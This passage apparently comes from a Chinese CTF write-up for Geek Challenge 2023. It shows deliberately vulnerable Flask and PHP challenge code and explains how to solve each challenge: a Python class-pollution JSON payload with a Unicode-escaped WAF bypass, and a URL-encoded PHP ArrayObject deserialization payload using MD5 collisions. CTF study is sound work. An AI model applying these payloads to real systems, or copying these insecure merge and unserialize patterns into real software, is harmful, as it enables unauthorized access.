class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;连用户名密码都没有你注册啥呢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;泰酷辣,没有注册成功捏&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;你的数字不对哦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;先登录去&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>代码中有 <code>merge()</code> 函数，参考：<a href="https://tttang.com/archive/1876/">Python原型链污染变体(prototype-pollution-in-python)</a></p><p>waf中包含 <code>isvip</code>，使用Unicode编码绕过关键字过滤。</p><p>对路由 <code>/register</code>，POST <code>&#123;&quot;username&quot;:&quot;xx&quot;,&quot;password&quot;:&quot;yy&quot;,&quot;__class__&quot; : &#123;&quot;__base__&quot; : &#123;&quot;is\u0076ip&quot; : 1&#125;&#125;&#125;</code></p><p>再登录访问 <code>/flag</code>，用 <code>+</code> 绕过判断：<code>/flag?num=+123456789</code>，查看源码得到flag。</p><p>​    </p><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><blockquote><p>我的女神呢？快帮我找找</p></blockquote><p>源码在 <code>havefun.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;key.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;进来啦&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;bro===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;错了哥们,再试试吧&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;好累，好想睡一觉啊&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;解密成功！&lt;br&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;快点的，急急急！！！&lt;br&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;真的只差一步了！&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;兄弟怎么搞的？&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;睡饱了，接着找！&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;快拿到我的小秘密了&lt;br&gt;&quot;</span>);</span><br><span class="line">                    <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span>(<span class="string">&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;</span>);</span><br><span class="line">                            <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span>(<span class="string">&quot;你别这样，她会生气的┭┮﹏┭┮&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;快帮我找找她！&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先反序列化 <code>useless</code> 类的 <code>__destruct()</code> 拿到 <code>key.php</code>：</p><p>用 <code>ArrayObject</code> 绕过 <code>/^[Oa]:[\d]+/i</code>，md5碰撞，再根据 <code>and</code> 的优先级无视 <code>$random</code>：</p><p><code>C:11:&quot;ArrayObject&quot;:196:&#123;x:i:0;O:7:&quot;useless&quot;:2:&#123;s:2:&quot;QW&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&quot;;s:3:&quot;YXX&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><code>basename()</code> 绕过 <code>$_SERVER[&#39;PHP_SELF&#39;]</code>：</p><p><code>/havefun.php/key.php?user=C:11:%22ArrayObject%22:196:&#123;x:i:0;O:7:%22useless%22:2:&#123;s:2:%22QW%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2%22;s:3:%22YXX%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2%22;&#125;;m:a:0:&#123;&#125;&#125;&amp;a=PHP_SELF</code></p><p>得到图片，信息是 <code>key=9</code>：</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/download.jpg" alt="download" style="zoom: 50%;"></p><p>最后再来一次反序列化链调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Me:__wakeup() （引用）</span><br><span class="line">her:__invoke()</span><br><span class="line">important:__sleep()</span><br><span class="line">useless:__get()</span><br><span class="line">her:find()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 